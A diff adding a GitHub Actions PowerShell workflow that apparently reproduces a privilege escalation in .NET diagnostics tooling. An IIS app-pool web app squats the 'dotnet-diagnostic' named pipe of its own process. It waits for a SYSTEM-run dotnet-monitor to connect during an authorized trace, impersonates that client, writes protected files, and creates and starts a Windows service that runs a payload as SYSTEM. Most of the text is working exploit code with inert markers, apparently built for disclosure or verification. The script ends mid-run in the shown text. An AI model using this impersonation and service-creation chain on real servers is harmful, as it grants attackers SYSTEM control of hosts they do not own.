@@ -1,0 +1,461 @@
+name: PA30 L105 authenticated HTTP trace on .NET 11
+on:
+  push:
+    branches: [pa30-rank01-l105-http-20261128]
+    paths:
+      - .github/workflows/pa30-l105-monitor-http-trace-net11.yml
+permissions:
+  contents: read
+jobs:
+  windows:
+    runs-on: windows-2025
+    timeout-minutes: 25
+    steps:
+      - uses: actions/setup-dotnet@v4
+        with:
+          dotnet-version: 11.0.100
+      - name: Test authenticated PID trace without default-process filter
+        shell: pwsh
+        run: |
+          $ErrorActionPreference = 'Stop'
+          $ProgressPreference = 'SilentlyContinue'
+          $root = Join-Path $env:RUNNER_TEMP 'Pa30L105Api'
+          $server = Join-Path $root 'rank21server'
+          $project = Join-Path $root 'web'
+          $published = Join-Path $root 'published'
+          $protected = Join-Path $root 'protected'
+          $sentinel = Join-Path $protected 'owner-only.txt'
+          $child = Join-Path $protected 'admin-child.txt'
+          $systemMarker = Join-Path $protected 'system-only.txt'
+          $systemDirect = Join-Path $protected 'system-direct.txt'
+          $serviceName = 'Pa30L105ApiProof'
+          $cmdExe = Join-Path $env:windir 'System32/cmd.exe'
+          $probeProject = Join-Path $root 'probe-project'
+          $probePublished = Join-Path $published 'probe-fixture'
+          if ($child -match '\s' -or $systemMarker -match '\s') { throw 'Inert marker path unexpectedly contains spaces' }
+          $attack = Join-Path $root 'attacker'
+          New-Item -ItemType Directory -Force -Path $root,$server,$project,$published,$protected,$attack,$probeProject | Out-Null
+          Set-Content -Path $sentinel -Value 'PA30-owned-inert-sentinel' -NoNewline
+          Set-Content -Path $systemMarker -Value 'PA30-system-baseline' -NoNewline
+          Set-Content -Path $systemDirect -Value 'PA30-system-direct-baseline' -NoNewline
+          dotnet --info | Select-Object -First 30
+          $feature = Get-WindowsOptionalFeature -Online -FeatureName IIS-URLAuthorization
+          if ($feature.State -ne 'Enabled') { Enable-WindowsOptionalFeature -Online -FeatureName IIS-URLAuthorization -All -NoRestart | Out-Null }
+          $installer = Join-Path $root 'dotnet-hosting-11.0.0-win.exe'
+          Invoke-WebRequest 'https://builds.dotnet.microsoft.com/dotnet/aspnetcore/Runtime/11.0.0/dotnet-hosting-11.0.0-win.exe' -OutFile $installer
+          $signature = Get-AuthenticodeSignature $installer
+          if ($signature.Status -ne 'Valid' -or $signature.SignerCertificate.Subject -notmatch 'Microsoft') { throw 'Official Hosting Bundle signature invalid' }
+          Write-Host "HOSTING_BUNDLE_SHA256=$((Get-FileHash $installer -Algorithm SHA256).Hash)"
+          $install = Start-Process $installer -ArgumentList '/quiet','/norestart' -Wait -PassThru
+          if ($install.ExitCode -notin @(0,3010)) { throw "Hosting Bundle exit $($install.ExitCode)" }
+          net stop was /y | Out-Host
+          net start w3svc | Out-Host
+          $module = Join-Path $env:ProgramFiles 'IIS/Asp.Net Core Module/V2/aspnetcorev2.dll'
+          if (-not (Test-Path $module)) { throw 'ANCM module missing' }
+          Write-Host "ANCM_SHA256=$((Get-FileHash $module -Algorithm SHA256).Hash)"
+          dotnet tool install dotnet-trace --tool-path (Join-Path $root 'tools') --version 10.0.750501
+          $tool = Join-Path $root 'tools/dotnet-trace.exe'
+          & $tool --version
+          dotnet tool install dotnet-monitor --tool-path (Join-Path $root 'monitor-tools') --version 10.0.5
+          if ($LASTEXITCODE -ne 0) { throw 'dotnet-monitor install failed' }
+          $monitorTool = Join-Path $root 'monitor-tools/dotnet-monitor.exe'
+          & $monitorTool --version
+          if ($LASTEXITCODE -ne 0) { throw 'dotnet-monitor version failed' }
+          dotnet new web -n Pa30Web -f net11.0 -o $project --no-restore | Out-Host
+          @'
+          using System.IO.Pipes;
+          using System.Security.Principal;
+          using System.Runtime.InteropServices;
+          var app = WebApplication.Create();
+          var root = Directory.GetParent(app.Environment.ContentRootPath)!.FullName;
+          var logPath = Path.Combine(root, "attacker", "web.trace");
+          var sentinelPath = Path.Combine(root, "protected", "owner-only.txt");
+          var writePath = Path.Combine(root, "protected", "admin-child.txt");
+          var systemMarkerPath = Path.Combine(root, "protected", "system-only.txt");
+          var systemDirectPath = Path.Combine(root, "protected", "system-direct.txt");
+          var probeSource = Path.Combine(app.Environment.ContentRootPath, "probe-fixture");
+          var probeDestination = Path.Combine(root, "attacker", "serviceprobe");
+          var serviceCommand = "\"" + Path.Combine(probeDestination, "Pa30ApiProbe.exe") + "\"";
+          app.MapGet("/", () => $"PID={Environment.ProcessId}");
+          app.MapGet("/arm", () => {
+              _ = Task.Run(() => {
+                  using var log = new StreamWriter(new FileStream(logPath, FileMode.Create, FileAccess.Write, FileShare.ReadWrite)) { AutoFlush = true };
+                  try {
+                      log.WriteLine($"ATTACKER_SID={WindowsIdentity.GetCurrent().User?.Value}");
+                      try { File.ReadAllText(sentinelPath); log.WriteLine("DIRECT_READ_DENIED=False"); }
+                      catch (Exception ex) { log.WriteLine($"DIRECT_READ_DENIED={ex is UnauthorizedAccessException} TYPE={ex.GetType().Name}"); }
+                      try { File.WriteAllText(writePath, "should-not-write"); log.WriteLine("DIRECT_WRITE_DENIED=False"); }
+                      catch (Exception ex) { log.WriteLine($"DIRECT_WRITE_DENIED={ex is UnauthorizedAccessException} TYPE={ex.GetType().Name}"); }
+                      try { File.WriteAllText(systemDirectPath, "should-not-write"); log.WriteLine("DIRECT_SYSTEM_WRITE_DENIED=False"); }
+                      catch (Exception ex) { log.WriteLine($"DIRECT_SYSTEM_WRITE_DENIED={ex is UnauthorizedAccessException} TYPE={ex.GetType().Name}"); }
+                      Directory.CreateDirectory(probeDestination);
+                      foreach (var file in Directory.GetFiles(probeSource, "*", SearchOption.AllDirectories)) {
+                          var relative = Path.GetRelativePath(probeSource, file);
+                          var target = Path.Combine(probeDestination, relative);
+                          Directory.CreateDirectory(Path.GetDirectoryName(target)!);
+                          File.Copy(file, target, true);
+                      }
+                      log.WriteLine($"SERVICE_CONTROLLER_PRESENT={Directory.GetFiles(probeDestination, "System.ServiceProcess.ServiceController.dll", SearchOption.AllDirectories).Length > 0}");
+                      log.WriteLine($"PAYLOAD_PLACED_AS_APPPOOL={File.Exists(Path.Combine(probeDestination, "Pa30ApiProbe.exe"))}");
+                      var directScm = Native.OpenSCManager(null, null, Native.SC_MANAGER_CREATE_SERVICE);
+                      var directScmError = directScm == IntPtr.Zero ? Marshal.GetLastWin32Error() : 0;
+                      if (directScm != IntPtr.Zero) Native.CloseServiceHandle(directScm);
+                      log.WriteLine($"DIRECT_SCM_DENIED={directScm == IntPtr.Zero && directScmError == 5} ERROR={directScmError}");
+                      using var pipe = new NamedPipeServerStream($"dotnet-diagnostic-{Environment.ProcessId}", PipeDirection.InOut, NamedPipeServerStream.MaxAllowedServerInstances);
+                      log.WriteLine($"PIPE_BOUND=True PID={Environment.ProcessId}");
+                      pipe.WaitForConnection();
+                      log.WriteLine($"FIRST_BYTE={pipe.ReadByte()}");
+                      pipe.RunAsClient(() => {
+                          log.WriteLine($"IMPERSONATED_SID={WindowsIdentity.GetCurrent().User?.Value}");
+                          log.WriteLine($"IMPERSONATION_LEVEL={WindowsIdentity.GetCurrent().ImpersonationLevel}");
+                          log.WriteLine($"PROTECTED_MATCH={File.ReadAllText(sentinelPath) == "PA30-owned-inert-sentinel"}");
+                          File.WriteAllText(writePath, "PA30-inert-admin-write");
+                          log.WriteLine("PROTECTED_WRITE=True");
+                          File.WriteAllText(systemDirectPath, "PA30-direct-system-write");
+                          log.WriteLine("IMPERSONATED_SYSTEM_DIRECT_WRITE=True");
+                          var scm = Native.OpenSCManager(null, null, Native.SC_MANAGER_CREATE_SERVICE);
+                          var scmError = scm == IntPtr.Zero ? Marshal.GetLastWin32Error() : 0;
+                          log.WriteLine($"IMPERSONATED_SCM_OPEN={scm != IntPtr.Zero} ERROR={scmError}");
+                          if (scm != IntPtr.Zero) {
+                              try {
+                                  var svc = Native.CreateService(scm, "Pa30L105ApiProof", "PA30 inert L105 SCM proof", Native.SERVICE_START | Native.DELETE,
+                                      Native.SERVICE_WIN32_OWN_PROCESS, Native.SERVICE_AUTO_START, 0, serviceCommand,
+                                      null, IntPtr.Zero, null, null, null);
+                                  var createError = svc == IntPtr.Zero ? Marshal.GetLastWin32Error() : 0;
+                                  log.WriteLine($"IMPERSONATED_SERVICE_CREATED={svc != IntPtr.Zero} ERROR={createError}");
+                                  if (svc != IntPtr.Zero) {
+                                      try {
+                                          var startOk = Native.StartService(svc, 0, IntPtr.Zero);
+                                          var startError = startOk ? 0 : Marshal.GetLastWin32Error();
+                                          log.WriteLine($"IMPERSONATED_SERVICE_START={startOk} ERROR={startError}");
+                                      } finally { Native.CloseServiceHandle(svc); }
+                                  }
+                              } finally { Native.CloseServiceHandle(scm); }
+                          }
+                          log.WriteLine("SCM_EFFECT_COMPLETE=True");
+                      });
+                  }
+                  catch (Exception ex) { log.WriteLine($"ATTACK_EXCEPTION={ex.GetType().Name} HRESULT={ex.HResult} MESSAGE={ex.Message}"); }
+                  finally { log.WriteLine("ATTACK_STOPPED=True"); }
+              });
+              return "ARMED";
+          });
+          app.Run();
+          internal static class Native {
+              internal const int SC_MANAGER_CREATE_SERVICE = 0x0002;
+              internal const int SERVICE_START = 0x0010;
+              internal const int DELETE = 0x00010000;
+              internal const int SERVICE_WIN32_OWN_PROCESS = 0x00000010;
+              internal const int SERVICE_AUTO_START = 0x00000002;
+              [DllImport("advapi32.dll", EntryPoint="OpenSCManagerW", CharSet=CharSet.Unicode, SetLastError=true)]
+              internal static extern IntPtr OpenSCManager(string? machine, string? database, int access);
+              [DllImport("advapi32.dll", EntryPoint="CreateServiceW", CharSet=CharSet.Unicode, SetLastError=true)]
+              internal static extern IntPtr CreateService(IntPtr scm, string name, string display, int access, int serviceType,
+                  int startType, int errorControl, string binaryPath, string? loadOrderGroup, IntPtr tagId,
+                  string? dependencies, string? account, string? password);
+              [DllImport("advapi32.dll", EntryPoint="StartServiceW", CharSet=CharSet.Unicode, SetLastError=true)]
+              [return: MarshalAs(UnmanagedType.Bool)]
+              internal static extern bool StartService(IntPtr service, int argc, IntPtr argv);
+              [DllImport("advapi32.dll", EntryPoint="CloseServiceHandle", SetLastError=true)]
+              [return: MarshalAs(UnmanagedType.Bool)]
+              internal static extern bool CloseServiceHandle(IntPtr handle);
+          }
+          '@ | Set-Content -Path (Join-Path $project 'Program.cs') -Encoding utf8
+          dotnet publish (Join-Path $project 'Pa30Web.csproj') -c Release -o $published | Out-Host
+          if ($LASTEXITCODE -ne 0) { throw 'Web app publish failed' }
+          if (-not (Select-String -Path (Join-Path $published 'web.config') -Pattern 'hostingModel="inprocess"' -Quiet)) { throw 'Published app not configured for in-process IIS' }
+          dotnet new console -n Pa30ApiProbe -f net11.0 -o $probeProject --no-restore | Out-Host
+          dotnet add (Join-Path $probeProject 'Pa30ApiProbe.csproj') package Microsoft.Extensions.Hosting.WindowsServices --version 11.0.0 | Out-Host
+          if ($LASTEXITCODE -ne 0) { throw 'Official WindowsServices package restore failed' }
+          @'
+          using Microsoft.Extensions.DependencyInjection;
+          using Microsoft.Extensions.Hosting;
+          using System.Security.Principal;
+          var log = Path.Combine(AppContext.BaseDirectory, "probe.log");
+          File.WriteAllText(log, "MAIN_ENTERED=True ARGC=" + args.Length);
+          try {
+              Host.CreateDefaultBuilder(Array.Empty<string>())
+                  .ConfigureServices(services => services.AddHostedService<ProbeWorker>())
+                  .UseWindowsService(options => options.ServiceName = "Pa30L105ApiProof")
+                  .Build().Run();
+          } catch (Exception ex) {
+              File.AppendAllText(log, "\nHOST_EXCEPTION=" + ex.GetType().Name + " HRESULT=" + ex.HResult + " MESSAGE=" + ex.Message);
+              throw;
+          }
+          sealed class ProbeWorker : BackgroundService {
+              protected override async Task ExecuteAsync(CancellationToken stoppingToken) {
+                  var log = Path.Combine(AppContext.BaseDirectory, "probe.log");
+                  var marker = File.ReadAllText(Path.Combine(AppContext.BaseDirectory, "marker.path"));
+                  try {
+                      var sid = WindowsIdentity.GetCurrent().User?.Value ?? "UNKNOWN";
+                      File.WriteAllText(log, "STARTED_SID=" + sid + "\nSERVICE_RUNNING=True");
+                      await Task.Delay(TimeSpan.FromSeconds(25), stoppingToken);
+                      File.WriteAllText(marker, sid);
+                      File.AppendAllText(log, "\nSYSTEM_MARKER_WRITTEN_AFTER_DELAY=True");
+                      await Task.Delay(Timeout.InfiniteTimeSpan, stoppingToken);
+                  } catch (OperationCanceledException) when (stoppingToken.IsCancellationRequested) {
+                      File.AppendAllText(log, "\nSERVICE_STOPPED=True");
+                  } catch (Exception ex) {
+                      File.AppendAllText(log, "\nPROBE_EXCEPTION=" + ex.GetType().Name + " HRESULT=" + ex.HResult + " MESSAGE=" + ex.Message);
+                  }
+              }
+          }
+          '@ | Set-Content -Path (Join-Path $probeProject 'Program.cs') -Encoding utf8
+          dotnet publish (Join-Path $probeProject 'Pa30ApiProbe.csproj') -c Release -p:UseAppHost=true -o $probePublished | Out-Host
+          Set-Content -Path (Join-Path $probePublished 'marker.path') -Value $systemMarker -NoNewline
+          if ($LASTEXITCODE -ne 0 -or -not (Test-Path (Join-Path $probePublished 'Pa30ApiProbe.exe'))) { throw 'Service probe publish failed' }
+          Write-Host "SERVICE_PROBE_EXE_SHA256=$((Get-FileHash (Join-Path $probePublished 'Pa30ApiProbe.exe') -Algorithm SHA256).Hash)"
+          $appcmd = Join-Path $env:windir 'System32/inetsrv/appcmd.exe'
+          & $appcmd add apppool /name:Pa30Pool | Out-Host
+          if ($LASTEXITCODE -ne 0) { throw 'Could not add app pool' }
+          & $appcmd set apppool Pa30Pool /managedRuntimeVersion:"" | Out-Host
+          if ($LASTEXITCODE -ne 0) { throw 'Could not configure app pool' }
+          $startMode = & $appcmd list apppool Pa30Pool /text:startMode
+          Write-Host "IIS_POOL_START_MODE=$startMode"
+          if ($startMode -ne 'OnDemand') { throw 'IIS default OnDemand mode not active' }
+          # Set a short periodic interval before any worker exists. No configuration
+          # write or explicit recycle occurs after monitor attachment.
+          & $appcmd set apppool Pa30Pool /recycling.periodicRestart.time:00:01:00 | Out-Host
+          if ($LASTEXITCODE -ne 0) { throw 'Could not configure periodic recycle interval' }
+          $timerInterval = & $appcmd list apppool Pa30Pool /text:recycling.periodicRestart.time
+          Write-Host "SCHEDULED_RECYCLE_INTERVAL=$timerInterval"
+          if ([TimeSpan]::Parse($timerInterval).TotalSeconds -ne 60) { throw 'Periodic recycle interval did not take effect' }
+          & $appcmd add site /name:Pa30Site /bindings:http/127.0.0.1:8911: "/physicalPath:$published" | Out-Host
+          if ($LASTEXITCODE -ne 0) { throw 'Could not add site' }
+          & $appcmd set app 'Pa30Site/' /applicationPool:Pa30Pool /preloadEnabled:false | Out-Host
+          if ($LASTEXITCODE -ne 0) { throw 'Could not configure site app' }
+          icacls $attack /grant 'IIS AppPool\Pa30Pool:(OI)(CI)M' | Out-Null
+          icacls $protected /inheritance:r /grant:r "$($env:USERNAME):(OI)(CI)F" 'SYSTEM:(OI)(CI)F' 'Administrators:(OI)(CI)F' | Out-Null
+          icacls $sentinel /inheritance:r /grant:r "$($env:USERNAME):R" 'SYSTEM:F' 'Administrators:F' | Out-Null
+          icacls $systemMarker /inheritance:r /grant:r 'SYSTEM:F' 'Administrators:R' | Out-Null
+          icacls $systemDirect /inheritance:r /grant:r 'SYSTEM:F' 'Administrators:R' | Out-Null
+          Write-Host "SYSTEM_MARKER_BASELINE=$(Get-Content $systemMarker -Raw)"
+          $adminIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+          $adminSid = $adminIdentity.User.Value
+          $isAdmin = [System.Security.Principal.WindowsPrincipal]::new($adminIdentity).IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
+          Write-Host "ADMIN_SID=$adminSid ADMIN_ROLE=$isAdmin"
+          if (-not $isAdmin) { throw 'Elevated administrator baseline failed' }
+          $siteState = & $appcmd list site Pa30Site /text:state
+          if ($siteState -ne 'Started') { & $appcmd start site Pa30Site | Out-Host }
+          function Test-Listed([int]$processId) {
+            $listing = & $tool ps | Out-String
+            if ($LASTEXITCODE -ne 0) { throw 'dotnet-trace ps failed' }
+            return [bool]($listing -match "(?m)^\s*$processId\s")
+          }
+          $normal = Invoke-WebRequest 'http://127.0.0.1:8911/' -UseBasicParsing -TimeoutSec 20
+          $normalMatch = [regex]::Match([string]$normal.Content, '^PID=(\d+)$')
+          if ($normal.StatusCode -ne 200 -or -not $normalMatch.Success) { throw 'Normal IIS request failed' }
+          $normalProcessId = [int]$normalMatch.Groups[1].Value
+          $normalListed = Test-Listed $normalProcessId
+          Write-Host "NORMAL_WORKER_PID=$normalProcessId NORMAL_LISTED=$normalListed"
+          if (-not $normalListed) { throw 'Normal diagnostics endpoint baseline failed' }
+          $normalCoreClrPath = @(Get-Process -Id $normalProcessId -Module | Where-Object ModuleName -eq 'coreclr.dll' | Select-Object -ExpandProperty FileName -First 1)
+          Write-Host "NORMAL_WORKER_CORECLR_PATH=$normalCoreClrPath"
+          if ($normalCoreClrPath.Count -ne 1 -or (Split-Path (Split-Path $normalCoreClrPath[0] -Parent) -Leaf) -ne '11.0.0') { throw 'Normal worker did not load .NET 11.0.0 CoreCLR' }
+          $validTracePath = Join-Path $root 'valid.nettrace'
+          $validTrace = Start-Process -FilePath $tool -ArgumentList @('collect','--process-id',$normalProcessId,'--duration','00:00:03','--output',$validTracePath) -Wait -PassThru -RedirectStandardOutput (Join-Path $root 'valid.out') -RedirectStandardError (Join-Path $root 'valid.err')
+          $validBytes = if (Test-Path $validTracePath) { (Get-Item $validTracePath).Length } else { 0 }
+          Write-Host "VALID_TRACE_EXIT=$($validTrace.ExitCode) VALID_TRACE_BYTES=$validBytes"
+          if ($validTrace.ExitCode -ne 0 -or $validBytes -le 0) { throw 'Genuine IIS diagnostics attach failed' }
+          $taskName = 'Pa30L105ApiMonitor'
+          $systemCmd = Join-Path $root 'monitor-system.cmd'
+          $systemMonitorOut = Join-Path $root 'monitor-system.out'
+          $quotedTool = '"' + $monitorTool + '"'
+          $quotedOut = '"' + $systemMonitorOut + '"'
+          $cmdLine = "$quotedTool collect --urls http://127.0.0.1:52401 --metricUrls http://127.0.0.1:52402 --temp-apikey > $quotedOut 2>&1"
+          @('@echo off', $cmdLine) | Set-Content -Path $systemCmd -Encoding ascii
+          Write-Host 'SYSTEM_TASK_MONITOR_FILTER=<none>'
+          $taskAction = New-ScheduledTaskAction -Execute $cmdExe -Argument ('/d /c "' + $systemCmd + '"')
+          $taskPrincipal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
+          Register-ScheduledTask -TaskName $taskName -Action $taskAction -Principal $taskPrincipal -Force | Out-Null
+          Start-ScheduledTask -TaskName $taskName
+          $systemMonitorCim = $null
+          for ($i=0; $i -lt 80; $i++) {
+            Start-Sleep -Milliseconds 250
+            $systemMonitorCim = Get-CimInstance Win32_Process -Filter "Name='dotnet-monitor.exe'" | Where-Object { $_.ExecutablePath -eq $monitorTool } | Select-Object -First 1
+            if ($systemMonitorCim) { break }
+          }
+          if (-not $systemMonitorCim) { throw 'Scheduled SYSTEM monitor did not launch' }
+          $monitorOwnerSid = (Invoke-CimMethod -InputObject $systemMonitorCim -MethodName GetOwnerSid).Sid
+          Write-Host "SYSTEM_MONITOR_PID=$($systemMonitorCim.ProcessId) OWNER_SID=$monitorOwnerSid"
+          if ($monitorOwnerSid -ne 'S-1-5-18') { throw 'Monitor is not running under LocalSystem' }
+          $baselineMonitor = Get-Process -Id $systemMonitorCim.ProcessId
+          # The temporary bearer key is generated for this disposable runner only.
+          # Read it from the local monitor log; never print it to public job logs.
+          $apiToken = $null
+          for ($i=0; $i -lt 50; $i++) {
+            Start-Sleep -Milliseconds 400
+            if ($baselineMonitor.HasExited) { break }
+            if (Test-Path $systemMonitorOut) {
+              $keyMatch = [regex]::Match((Get-Content $systemMonitorOut -Raw), '(?i)Bearer\s+([A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)')
+              if ($keyMatch.Success) { $apiToken = $keyMatch.Groups[1].Value; break }
+            }
+          }
+          $keyCaptured = -not [string]::IsNullOrWhiteSpace($apiToken)
+          Write-Host "SYSTEM_MONITOR_KEY_CAPTURED=$keyCaptured BASELINE_MONITOR_ALIVE=$(-not $baselineMonitor.HasExited)"
+          if (-not $keyCaptured -or $baselineMonitor.HasExited) { throw 'Disposable monitor API key not captured' }
+          $apiHeaders = @{ Authorization = "Bearer $apiToken" }
+          $unauthProcesses = Invoke-WebRequest 'http://127.0.0.1:52401/processes' -UseBasicParsing -SkipHttpErrorCheck -TimeoutSec 5
+          $authProcesses = Invoke-WebRequest 'http://127.0.0.1:52401/processes' -Headers $apiHeaders -UseBasicParsing -SkipHttpErrorCheck -TimeoutSec 5
+          $apiBaseline = $unauthProcesses.StatusCode -eq 401 -and $authProcesses.StatusCode -eq 200
+          Write-Host "UNAUTH_PROCESSES_STATUS=$($unauthProcesses.StatusCode) AUTH_PROCESSES_STATUS=$($authProcesses.StatusCode) AUTH_API_BASELINE=$apiBaseline"
+          if (-not $apiBaseline) { throw 'Documented authenticated monitor process API baseline failed' }
+          $recycleMonitor = $baselineMonitor
+          Write-Host "RECYCLE_MONITOR_ALIVE_BEFORE_TIMER_WAIT=$(-not $recycleMonitor.HasExited)"
+          $timerWaitStart = Get-Date
+          $idleWorker = $null
+          for ($i=0; $i -lt 300; $i++) {
+            $workers = @(Get-CimInstance Win32_Process -Filter "Name='w3wp.exe'" | Where-Object { $_.CommandLine -like '*Pa30Pool*' -and [int]$_.ProcessId -ne $normalProcessId })
+            if ($workers.Count -eq 1) { $idleWorker = $workers[0]; break }
+            if ($recycleMonitor.HasExited) { throw 'Monitor exited while waiting for timer recycle' }
+            Start-Sleep -Milliseconds 500
+          }
+          if ($null -eq $idleWorker) { throw "No distinct w3wp worker during periodic recycle wait; found=$($workers.Count)" }
+          $timerWaitSeconds = [int]((Get-Date) - $timerWaitStart).TotalSeconds
+          Write-Host "TIMER_WAIT_SECONDS=$timerWaitSeconds OLD_WORKER_ALIVE_AFTER_TIMER=$([bool](Get-Process -Id $normalProcessId -ErrorAction SilentlyContinue)) RECYCLE_MONITOR_ALIVE_AFTER_TIMER=$(-not $recycleMonitor.HasExited)"
+          $idleProcessId = [int]$idleWorker.ProcessId
+          $modules = @(Get-Process -Id $idleProcessId -Module | ForEach-Object ModuleName)
+          $coreclrBefore = $modules -contains 'coreclr.dll'
+          $idleListed = Test-Listed $idleProcessId
+          Write-Host "IDLE_WORKER_PID=$idleProcessId CORECLR_BEFORE=$coreclrBefore IDLE_LISTED=$idleListed"
+          Write-Host "::notice title=PA30 IIS idle state::PID=$idleProcessId CORECLR_BEFORE=$coreclrBefore IDLE_LISTED=$idleListed"
+          if ($coreclrBefore -or $idleListed) { throw 'IIS worker loaded CLR or diagnostics before first request' }
+          $noFake = Start-Process -FilePath $tool -ArgumentList @('collect','--process-id',$idleProcessId,'--duration','00:00:03','--output',(Join-Path $root 'no-fake.nettrace')) -PassThru -RedirectStandardOutput (Join-Path $root 'no-fake.out') -RedirectStandardError (Join-Path $root 'no-fake.err')
+          $noFakeCompleted = $noFake.WaitForExit(8000)
+          if (-not $noFakeCompleted) { Stop-Process -Id $noFake.Id -Force; if (-not $noFake.WaitForExit(5000)) { throw 'No-fake control failed to stop' } }
+          Write-Host "NO_FAKE_NEW_PID_COMPLETED=$noFakeCompleted NO_FAKE_NAME_EXIT=$(if ($noFakeCompleted) { $noFake.ExitCode } else { 'bounded-wait' })"
+          if ($noFakeCompleted -and $noFake.ExitCode -eq 0) { throw 'No-fake name attach unexpectedly succeeded' }
+          $ready = Invoke-WebRequest 'http://127.0.0.1:8911/' -UseBasicParsing -TimeoutSec 30
+          $runtimeReady = $ready.StatusCode -eq 200 -and $ready.Content -eq "PID=$idleProcessId" -and (Test-Listed $idleProcessId)
+          $workerCim = Get-CimInstance Win32_Process -Filter "ProcessId=$idleProcessId"
+          $workerOwner = Invoke-CimMethod -InputObject $workerCim -MethodName GetOwner
+          $sameIdentity = $workerOwner.Domain -eq 'IIS APPPOOL' -and $workerOwner.User -eq 'Pa30Pool'
+          Write-Host "RUNTIME_READY_BEFORE_SERVICE=$runtimeReady WORKER_OWNER=$($workerOwner.Domain)\$($workerOwner.User) SAME_IDENTITY=$sameIdentity"
+          if (-not $runtimeReady -or -not $sameIdentity) { throw 'Genuine default app-pool endpoint not ready before attack route' }
+          $armed = Invoke-WebRequest 'http://127.0.0.1:8911/arm' -UseBasicParsing -TimeoutSec 20
+          if ($armed.StatusCode -ne 200 -or $armed.Content -ne 'ARMED') { throw 'Attacker route did not arm' }
+          $attackTrace = Join-Path $attack 'web.trace'
+          $initialTrace = ''
+          for ($i=0; $i -lt 150; $i++) {
+            if (Test-Path $attackTrace) {
+              $initialTrace = Get-Content $attackTrace -Raw
+              if ($initialTrace -match 'PIPE_BOUND=True' -or $initialTrace -match 'ATTACK_EXCEPTION=') { break }
+            }
+            Start-Sleep -Milliseconds 100
+          }
+          Write-Host "ATTACK_TRACE=$($initialTrace.Replace("`r"," ").Replace("`n"," | "))"
+          $attackerSidMatch = [regex]::Match($initialTrace, 'ATTACKER_SID=(S-1-5-82-[0-9-]+)')
+          $bound = $initialTrace -match 'PIPE_BOUND=True' -and $initialTrace -match "PID=$idleProcessId"
+          $directDenied = $initialTrace -match 'DIRECT_READ_DENIED=True' -and $initialTrace -match 'DIRECT_WRITE_DENIED=True'
+          Write-Host "APPPOOL_SID=$($attackerSidMatch.Groups[1].Value) APPPOOL_BOUND=$bound DIRECT_DENIED=$directDenied"
+          if (-not $attackerSidMatch.Success -or -not $bound -or -not $directDenied) { throw 'Default app-pool attacker did not bind or direct denial failed' }
+          # No configured default-process filter: a retained monitor must not
+          # contact this forged pipe before an authorized explicit-PID request.
+          Start-Sleep -Seconds 4
+          $preApiTrace = Get-Content $attackTrace -Raw
+          $preApiContact = $preApiTrace -match 'FIRST_BYTE=' -or $preApiTrace -match 'SCM_EFFECT_COMPLETE=True'
+          Write-Host "NO_FILTER_PRE_API_FAKE_CONTACT=$preApiContact MONITOR_ALIVE=$(-not $recycleMonitor.HasExited)"
+          if ($preApiContact -or $recycleMonitor.HasExited) { throw 'No-filter pre-API control failed' }
+          $traceUri = "http://127.0.0.1:52401/trace?pid=$idleProcessId&durationSeconds=3"
+          $unauthTrace = Invoke-WebRequest $traceUri -UseBasicParsing -SkipHttpErrorCheck -TimeoutSec 5
+          Start-Sleep -Seconds 2
+          $unauthTraceContact = (Get-Content $attackTrace -Raw) -match 'FIRST_BYTE='
+          $unauthDenied = $unauthTrace.StatusCode -eq 401 -and -not $unauthTraceContact
+          Write-Host "UNAUTH_TRACE_STATUS=$($unauthTrace.StatusCode) UNAUTH_TRACE_FAKE_CONTACT=$unauthTraceContact UNAUTH_TRACE_DENIED=$unauthDenied"
+          if (-not $unauthDenied) { throw 'Unauthenticated trace control failed' }
+          $authTraceOutcome = '<not-started>'
+          $authTraceStarted = $true
+          try {
+            $authTraceResponse = Invoke-WebRequest $traceUri -Headers $apiHeaders -UseBasicParsing -SkipHttpErrorCheck -TimeoutSec 15 -OutFile (Join-Path $root 'api-trace.nettrace')
+            $authTraceOutcome = [string]$authTraceResponse.StatusCode
+          } catch {
+            $authTraceOutcome = $_.Exception.GetType().Name
+          }
+          Write-Host "AUTHORIZED_TRACE_REQUEST_STARTED=$authTraceStarted AUTH_TRACE_OUTCOME=$authTraceOutcome"
+          for ($i=0; $i -lt 60; $i++) {
+            if ((Get-Content $attackTrace -Raw) -match 'SCM_EFFECT_COMPLETE=True') { break }
+            if ($recycleMonitor.HasExited) { break }
+            Start-Sleep -Milliseconds 500
+          }
+          $recycleMonitorAlive = -not $recycleMonitor.HasExited
+          $recycleTrace = Get-Content $attackTrace -Raw
+          $recycleReceived = $recycleTrace -match 'FIRST_BYTE=' -or $recycleTrace -match 'SCM_EFFECT_COMPLETE=True'
+          Write-Host "AUTH_PID_TRACE_MONITOR_ALIVE=$recycleMonitorAlive AUTH_PID_TRACE_FAKE_RECEIVED=$recycleReceived"
+          if ($recycleMonitorAlive) { Stop-Process -Id $recycleMonitor.Id -Force }
+          Stop-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
+          Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
+          Write-Host 'SYSTEM_MONITOR_TASK_REMOVED=True'
+          $fakeReceived = $recycleReceived
+          if (-not $fakeReceived) { throw 'Authorized explicit-PID trace did not reach fake pipe' }
+          $markerBeforeWorkerStop = Get-Content $systemMarker -Raw
+          Write-Host "MONITOR_STOPPED_BEFORE_DELAYED_MARKER=$($markerBeforeWorkerStop -eq 'PA30-system-baseline')"
+          if ($markerBeforeWorkerStop -ne 'PA30-system-baseline') { throw 'Delayed marker occurred before monitor stop' }
+          & $appcmd stop apppool Pa30Pool | Out-Host
+          if ($LASTEXITCODE -ne 0) { throw 'Could not stop attacker app pool' }
+          for ($i=0; $i -lt 40 -and (Get-Process -Id $idleProcessId -ErrorAction SilentlyContinue); $i++) { Start-Sleep -Milliseconds 500 }
+          $workerGone = -not [bool](Get-Process -Id $idleProcessId -ErrorAction SilentlyContinue)
+          $serviceBefore = Get-CimInstance Win32_Service -Filter "Name='$serviceName'"
+          $scmTrace = Get-Content $attackTrace -Raw
+          Write-Host "SCM_ATTACK_TRACE=$($scmTrace.Replace("`r"," ").Replace("`n"," | "))"
+          $earlyProbeLogPath = Join-Path $attack 'serviceprobe/probe.log'
+          $earlyProbeLog = if (Test-Path $earlyProbeLogPath) { Get-Content $earlyProbeLogPath -Raw } else { '<missing>' }
+          Write-Host "EARLY_SERVICE_PROBE_LOG=$($earlyProbeLog.Replace("`r"," ").Replace("`n"," | "))"
